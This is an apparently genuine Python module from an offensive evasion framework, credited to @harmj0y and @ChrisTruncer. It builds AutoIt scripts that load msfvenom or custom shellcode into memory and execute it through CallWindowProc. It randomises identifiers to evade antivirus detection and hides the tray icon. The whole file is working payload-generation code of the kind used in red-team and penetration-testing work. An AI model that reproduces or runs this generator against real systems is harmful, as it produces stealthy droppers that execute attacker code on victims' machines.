"""

AutoIT wrapper for shellcode injection.


Module built by @harmj0y
Updated by @ChrisTruncer

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.shortname = "Inline"
        self.description = "VirtualAlloc pattern for shellcode injection"
        self.language = "autoit"
        self.rating = "Normal"
        self.extension = "au3"
        self.name = "AutoIt Flat Shellcode Injector"
        self.path = "autoit/shellcode_inject/flat"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"]
        }

    def generate(self):

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode

        # get it in AutoITs format
        Shellcode = "0x" + "".join(Shellcode.split("\\x"))
        total_size = len(Shellcode)

        RandFuncName = evasion_helpers.randomString()
        RandArgName = evasion_helpers.randomString()
        RandASMVarName = evasion_helpers.randomString()
        RandASMBufferName = evasion_helpers.randomString()
        RandBinBufferName = evasion_helpers.randomString()
        length_limit = 4000

        # keep that pesky tray icon from appearing
        payload_code = "#NoTrayIcon\n"
        payload_code += RandFuncName + '(fileread("%WinDir%\\system32\\calc.exe"))\n'
        payload_code += 'Func ' + RandFuncName + '($' + RandArgName + ')\n'
        if total_size > length_limit:
            all_lines = [Shellcode[i:i+length_limit] for i in range(0, len(Shellcode), length_limit)]
            first_run = True
            for line in all_lines:
                if first_run:
                    payload_code += '\tLocal $' + RandASMVarName + '="' + line + '"\n'
                    first_run = False
                else:
                    payload_code += '\t$' + RandASMVarName + ' = $' + RandASMVarName + ' & "' + line + '"\n'
        else:
            payload_code += '\tLocal $' + RandASMVarName + '="' + Shellcode + '"\n'
        payload_code += '\tLocal $' + RandASMBufferName + ' = DllStructCreate("byte[" & BinaryLen($' + RandASMVarName + ') & "]")\n'
        payload_code += '\tLocal $' + RandBinBufferName + ' = DllStructCreate("byte[" & BinaryLen($' + RandArgName + ') & "]")\n'
        payload_code += '\tDllStructSetData($' + RandASMBufferName + ', 1, $' + RandASMVarName + ')\n'
        payload_code += '\tDllStructSetData($' + RandBinBufferName + ', 1, $' + RandArgName + ')\n'
        payload_code += '\tLocal $Ret = DllCall("user32.dll", "int", "CallWindowProc", "ptr", DllStructGetPtr($' + RandASMBufferName + '), "ptr", DllStructGetPtr($' + RandBinBufferName + '), "int", 0, "int", 0, "int", 0)\n'
        payload_code += "EndFunc\n"

        self.payload_source_code = payload_code
        return
